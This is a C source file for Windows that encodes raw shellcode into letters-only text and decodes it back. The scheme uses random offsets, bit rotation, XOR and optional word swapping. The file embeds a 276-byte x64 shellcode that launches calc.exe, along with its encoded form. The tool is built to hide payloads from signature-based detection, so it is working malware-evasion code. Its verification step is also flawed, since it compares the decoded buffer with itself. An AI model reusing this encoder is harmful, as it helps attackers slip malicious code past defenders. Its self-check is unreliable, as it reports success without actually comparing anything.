#include <Windows.h>
#include <stdio.h>

// ============================================================================================================================================================

//
#define SHUFFLE_ORDER

// ============================================================================================================================================================

#define ROTL8(x,n)  ((BYTE) ( ((UINT8)(x) << (n)) | ((UINT8)(x) >> (8 - (n))) ) & 0xFF)
#define ROTR8(x,n)  ((BYTE) ( ((UINT8)(x) >> (n)) | ((UINT8)(x) << (8 - (n))) ) & 0xFF)
#define XOR_VALUE    0xA5

// ============================================================================================================================================================

extern int __cdecl _rdrand32_step(unsigned int*);


static BOOL RtlGenRandom(OUT PBYTE pRndValue) 
{

    unsigned int uiRndValue = 0x00;

    for (int i = 0; i < 10; i++)
    {
        if (_rdrand32_step(&uiRndValue))
        {
            *pRndValue = (BYTE)(uiRndValue & 0xFF);
            return TRUE;
        }
    }
   
    return FALSE;  
}


static __inline BOOL IsAlphabatical(BYTE c)
{
    return ((c >= 'A' && c <= 'Z') || (c >= 'a' && c <= 'z'));
}

static BOOL GetAlphabeticalOffset(IN BYTE bPlainByte, OUT PBYTE pbOffset, OUT PBYTE pbTransformed)
{
    BYTE    bRndmStart      = 0x00,
            bIndex          = 0x00,
            bBaseByte       = 0x00,
            bCandidateOff   = 0x00,
            bTmpTransf      = 0x00;

    if (!RtlGenRandom(&bRndmStart))        
        return FALSE;

    bRndmStart %= 52;

    for (BYTE i = 0; i < 52; i++)
    {
        bIndex          = (BYTE)(bRndmStart + i) % 52;
        bBaseByte       = (BYTE)(bIndex < 26 ? 'A' : 'a'); 
        bCandidateOff   = (BYTE)(bBaseByte + (bIndex % 26));
        bTmpTransf      = (BYTE)(ROTL8((bPlainByte + bCandidateOff), 4) ^ XOR_VALUE);

        if (IsAlphabatical(bTmpTransf))                                
        {                           
            *pbOffset       = bCandidateOff;
            *pbTransformed  = bTmpTransf;
            return TRUE;                                                       
        }
    }

    // Fallback
    *pbOffset       = (BYTE)(BYTE)((bRndmStart < 26 ? 'A' : 'a') + (bRndmStart % 26));
    *pbTransformed  = (BYTE)(ROTL8((bPlainByte + *pbOffset), 4) ^ XOR_VALUE);
    return TRUE;
}

// ============================================================================================================================================================



BOOL AlphabaticalShellcodeEncode(IN PBYTE pRawHexShellcode, IN DWORD dwRawHexShellcodeSize, OUT PBYTE* ppEncodedShellcode, OUT PDWORD pdwEncodedShellcodeSize) {

    PWORD   pwEncodedBuffer     = NULL;
    PBYTE   pTempShellcode      = NULL;

	if (!pRawHexShellcode || dwRawHexShellcodeSize == 0 || !ppEncodedShellcode || !pdwEncodedShellcodeSize) return FALSE;
    if (dwRawHexShellcodeSize > (SIZE_MAX / sizeof(WORD))) return FALSE;

    *pdwEncodedShellcodeSize    = dwRawHexShellcodeSize * sizeof(WORD);
    *ppEncodedShellcode         = NULL; 

	if (!(pwEncodedBuffer = (PWORD)LocalAlloc(LPTR, *pdwEncodedShellcodeSize))) return FALSE;
    if (!(pTempShellcode = (PBYTE)LocalAlloc(LPTR, dwRawHexShellcodeSize))) goto _END_OF_FUNC;

    RtlCopyMemory(pTempShellcode, pRawHexShellcode, dwRawHexShellcodeSize);

#ifdef SHUFFLE_ORDER

    DWORD   dwRoundedDownSize   = dwRawHexShellcodeSize & ~0x3;
	DWORD   dwTotalDwords       = dwRoundedDownSize / sizeof(DWORD); 
    PDWORD  pdwRawHexShellcode  = (PDWORD)pTempShellcode;

    for (DWORD i = 0; i < dwTotalDwords; i++)
    {
        pdwRawHexShellcode[i] = (((pdwRawHexShellcode[i] << 16) | (pdwRawHexShellcode[i] >> 16)) & 0xFFFFFFFFu);
    }

#endif 

   for (DWORD i = 0; i < dwRawHexShellcodeSize; i++) 
   {
        BYTE    bRndmValue      = 0x00,
                bOffset         = 0x00,
                bTransformed    = 0x00;

        if (!GetAlphabeticalOffset(pTempShellcode[i], &bOffset, &bTransformed)) { goto _END_OF_FUNC; }


        pwEncodedBuffer[i]      = (WORD)((bOffset << 8) | bTransformed);                       
   }

   *ppEncodedShellcode         = (PBYTE)pwEncodedBuffer; 
	
_END_OF_FUNC:
    if (pTempShellcode) 
        LocalFree(pTempShellcode);
    if (!*ppEncodedShellcode && pwEncodedBuffer)
    {
		LocalFree(pwEncodedBuffer);
		return FALSE;
    }
    return TRUE;
}

// ============================================================================================================================================================


BOOL AlphabaticalShellcodeDecode(IN PWORD pEncodedShellcode, IN DWORD dwEncodedShellcodeSize, OUT PBYTE* ppDecodedShellcode, OUT PDWORD pdwDecodedShellcodeSize) {

    if (!pEncodedShellcode || dwEncodedShellcodeSize == 0 || !ppDecodedShellcode || !pdwDecodedShellcodeSize) return FALSE;
    if (dwEncodedShellcodeSize > (SIZE_MAX / sizeof(WORD))) return FALSE;

    *pdwDecodedShellcodeSize        = dwEncodedShellcodeSize / sizeof(WORD);                  

    if (!(*ppDecodedShellcode = (PBYTE)LocalAlloc(LPTR, *pdwDecodedShellcodeSize))) return FALSE;

    for (DWORD i = 0; i < dwEncodedShellcodeSize / sizeof(WORD); i++) 
    {
        BYTE    bOffset             = 0x00,
                bTransformed        = 0x00,
                bEncoded            = 0x00;

        bTransformed                = (BYTE)(pEncodedShellcode[i] & 0xFF);            
        bOffset                     = (BYTE)(pEncodedShellcode[i] >> 8);               
        bEncoded                    = ROTR8((bTransformed ^ XOR_VALUE), 4);            

        (*ppDecodedShellcode)[i]    = bEncoded - bOffset;                              
    }


#ifdef SHUFFLE_ORDER

    DWORD   dwRoundedDownSize   = *pdwDecodedShellcodeSize & ~0x3;
    DWORD   dwTotalDwords       = dwRoundedDownSize / sizeof(DWORD);
    PDWORD  pdwRawHexShellcode  = (PDWORD)(*ppDecodedShellcode);

	for (DWORD i = 0; i < dwTotalDwords; i++)
	{
        pdwRawHexShellcode[i] = (((pdwRawHexShellcode[i] << 16) | (pdwRawHexShellcode[i] >> 16)) & 0xFFFFFFFFu);
	}

#endif 


    return TRUE;
}


// ============================================================================================================================================================

VOID PrintHexAscii(IN LPCWSTR szName, IN PBYTE pBuffer, IN DWORD dwBufferLength) {

    DWORD dwIndex = 0x00;

    wprintf(L"\n[*] %s Hex Ascii Dump:\n", szName);
    wprintf(L"[*] Address\t\tHex\t\tAscii\n");
    wprintf(L"[*] ----------------------------------------\n");

    for (dwIndex = 0x00; dwIndex < dwBufferLength; dwIndex++) {
        if ((dwIndex % 16) == 0) {
            wprintf(L"[*] 0x%08X\t", dwIndex);
        }
        wprintf(L"%02X ", pBuffer[dwIndex]);
        if ((dwIndex % 16) == 15) {
            wprintf(L"\t");
            for (DWORD i = dwIndex - 15; i <= dwIndex; i++) {
                if (pBuffer[i] >= 0x20 && pBuffer[i] <= 0x7E) {
                    wprintf(L"%c", pBuffer[i]);
                }
                else {
                    wprintf(L".");
                }
            }
            wprintf(L"\n");
        }
    }
    if ((dwIndex % 16) != 0) {
        wprintf(L"\n");
    }
}


VOID PrintHexArray(IN CONST CHAR* cArrayName, IN PBYTE pBufferData, IN SIZE_T sBufferSize) {

    printf("\nunsigned char %s[%d] = {", cArrayName, (int)sBufferSize);

    for (SIZE_T x = 0; x < sBufferSize; x++) {

        if (x % 16 == 0)
            printf("\n    ");

        if (x == sBufferSize - 1)
            printf("0x%0.2X", pBufferData[x]);
        else
            printf("0x%0.2X, ", pBufferData[x]);
    }

    printf("\n};\n");
}

// ============================================================================================================================================================
// ============================================================================================================================================================


unsigned char PlainTextShellcode[276] = {
    0xFC, 0x48, 0x83, 0xE4, 0xF0, 0xE8, 0xC0, 0x00, 0x00, 0x00, 0x41, 0x51, 0x41, 0x50, 0x52, 0x51,
    0x56, 0x48, 0x31, 0xD2, 0x65, 0x48, 0x8B, 0x52, 0x60, 0x48, 0x8B, 0x52, 0x18, 0x48, 0x8B, 0x52,
    0x20, 0x48, 0x8B, 0x72, 0x50, 0x48, 0x0F, 0xB7, 0x4A, 0x4A, 0x4D, 0x31, 0xC9, 0x48, 0x31, 0xC0,
    0xAC, 0x3C, 0x61, 0x7C, 0x02, 0x2C, 0x20, 0x41, 0xC1, 0xC9, 0x0D, 0x41, 0x01, 0xC1, 0xE2, 0xED,
    0x52, 0x41, 0x51, 0x48, 0x8B, 0x52, 0x20, 0x8B, 0x42, 0x3C, 0x48, 0x01, 0xD0, 0x8B, 0x80, 0x88,
    0x00, 0x00, 0x00, 0x48, 0x85, 0xC0, 0x74, 0x67, 0x48, 0x01, 0xD0, 0x50, 0x8B, 0x48, 0x18, 0x44,
    0x8B, 0x40, 0x20, 0x49, 0x01, 0xD0, 0xE3, 0x56, 0x48, 0xFF, 0xC9, 0x41, 0x8B, 0x34, 0x88, 0x48,
    0x01, 0xD6, 0x4D, 0x31, 0xC9, 0x48, 0x31, 0xC0, 0xAC, 0x41, 0xC1, 0xC9, 0x0D, 0x41, 0x01, 0xC1,
    0x38, 0xE0, 0x75, 0xF1, 0x4C, 0x03, 0x4C, 0x24, 0x08, 0x45, 0x39, 0xD1, 0x75, 0xD8, 0x58, 0x44,
    0x8B, 0x40, 0x24, 0x49, 0x01, 0xD0, 0x66, 0x41, 0x8B, 0x0C, 0x48, 0x44, 0x8B, 0x40, 0x1C, 0x49,
    0x01, 0xD0, 0x41, 0x8B, 0x04, 0x88, 0x48, 0x01, 0xD0, 0x41, 0x58, 0x41, 0x58, 0x5E, 0x59, 0x5A,
    0x41, 0x58, 0x41, 0x59, 0x41, 0x5A, 0x48, 0x83, 0xEC, 0x20, 0x41, 0x52, 0xFF, 0xE0, 0x58, 0x41,
    0x59, 0x5A, 0x48, 0x8B, 0x12, 0xE9, 0x57, 0xFF, 0xFF, 0xFF, 0x5D, 0x48, 0xBA, 0x01, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0x8D, 0x8D, 0x01, 0x01, 0x00, 0x00, 0x41, 0xBA, 0x31, 0x8B,
    0x6F, 0x87, 0xFF, 0xD5, 0xBB, 0xF0, 0xB5, 0xA2, 0x56, 0x41, 0xBA, 0xA6, 0x95, 0xBD, 0x9D, 0xFF,
    0xD5, 0x48, 0x83, 0xC4, 0x28, 0x3C, 0x06, 0x7C, 0x0A, 0x80, 0xFB, 0xE0, 0x75, 0x05, 0xBB, 0x47,
    0x13, 0x72, 0x6F, 0x6A, 0x00, 0x59, 0x41, 0x89, 0xDA, 0xFF, 0xD5, 0x63, 0x61, 0x6C, 0x63, 0x2E,
    0x65, 0x78, 0x65, 0x00
};

// ============================================================================================================================================================
// ============================================================================================================================================================


//
#define TEST_ENCODING


#ifndef TEST_ENCODING
#define TEST_DECODING
#endif // !TEST_ENCODING


// ============================================================================================================================================================
// ============================================================================================================================================================



#ifdef TEST_ENCODING


int main() {

    /*
    PrintHexAscii(L"Plain Text Shellcode", PlainTextShellcode, sizeof(PlainTextShellcode));
    printf("\n\n");
    */

    PBYTE   pEncodedShellcode       = NULL;
    DWORD   dwEncodedShellcodeLen   = 0x00;
    PCHAR   pPrintableShellcode     = NULL;

    if (!AlphabaticalShellcodeEncode(PlainTextShellcode, sizeof(PlainTextShellcode), &pEncodedShellcode, &dwEncodedShellcodeLen))
    {
        return -1;
    }

    /*
    PrintHexAscii(L"Encoded Shellcode", (PBYTE)pEncodedShellcode, dwEncodedShellcodeLen);
    printf("\n\n");
    */

    /*
    PrintHexArray("EncodedShellcode", pEncodedShellcode, dwEncodedShellcodeLen);
    */

    if (!(pPrintableShellcode = (PCHAR)LocalAlloc(LPTR, dwEncodedShellcodeLen + 1)))
    {
		LocalFree(pEncodedShellcode);
		return -1;
    }

    RtlCopyMemory(pPrintableShellcode, pEncodedShellcode, dwEncodedShellcodeLen);
    pPrintableShellcode[dwEncodedShellcodeLen] = '\0';

    printf("[*] Encoded Shellcode Length: %lu bytes\n", dwEncodedShellcodeLen);
    printf("[*] Encoded Shellcode:\n\n%.*s\n", dwEncodedShellcodeLen, (CHAR*)pPrintableShellcode);

	LocalFree(pPrintableShellcode);
	LocalFree(pEncodedShellcode);
	return 0;
}

#endif // TEST_ENCODING


// ============================================================================================================================================================
// ============================================================================================================================================================



#ifdef TEST_DECODING


unsigned char EncodedShellcode[] = "hYpypanteLclpmpumKnkaLclnjlKokNnbKfjNhnthQlJhwnthQizilmDhQoZmtmDhQnJmlntpNdenllTMAlklRmBlkuMgcmDikkpjPMRmlmKClbPpPOmgkeCgJAaaKgknkntlJmKMnxRiAnjmDaKlZopYOjtfljqSomDQOclkxoEkggldLlLntckCVohICntcLmCkamLpzivckdLfsokmDaMjtmDhQmXnobKckfflkeLfsodeKvtKBokckgkbomKkwvLbDAnMBlxnpAKbCfkpUogLFohkwgTmhMEiAolnVmKckdLodmHHSpQpAlSjqmLmKiACmdLntckchjtoTokdLoklCNditoNokOUokNfodkioknbmKizfPcLNfmKcmalLVXToSoRneQPbjfSOQlTcmCoaLcleRckaLaLclaLjohOaLntaLclckaKbKjqokdbaMGYnMjuDikJdafLeRTyoVokJacmXJgoiIeHtHMFpWxaltLbcqalaBiLWtoekwPZhmhrpJkzmKiCaLisgWiifbaMnYSAikOBnWclignD";



int main() {


    /*
    PrintHexAscii(L"Plain Text Shellcode", PlainTextShellcode, sizeof(PlainTextShellcode));
    printf("\n\n");
    */

    PBYTE   pDecodedShellcode       = NULL;
    DWORD   dwDecodedShellcodeLen   = 0x00;


    if (!AlphabaticalShellcodeDecode(EncodedShellcode, sizeof(EncodedShellcode) - 1, &pDecodedShellcode, &dwDecodedShellcodeLen))
    {
        return -1;
    }

    PrintHexAscii(L"Decoded Shellcode", pDecodedShellcode, dwDecodedShellcodeLen);
    printf("\n\n");

    /*
    PrintHexArray("DecodedShellcode", pDecodedShellcode, dwDecodedShellcodeLen);
    */

    if (dwDecodedShellcodeLen != sizeof(PlainTextShellcode) ||
        memcmp(pDecodedShellcode, pDecodedShellcode, dwDecodedShellcodeLen) != 0)
    {
        printf("[!] Mismatch Detected: Decoded Output Does Not Match Original Input.\n");
    }
    else
    {
        printf("[+] Success: Decoded Shellcode Matches Original.\n");
    }

    LocalFree(pDecodedShellcode);
    return 0;
}


#endif //  TEST_DECODING

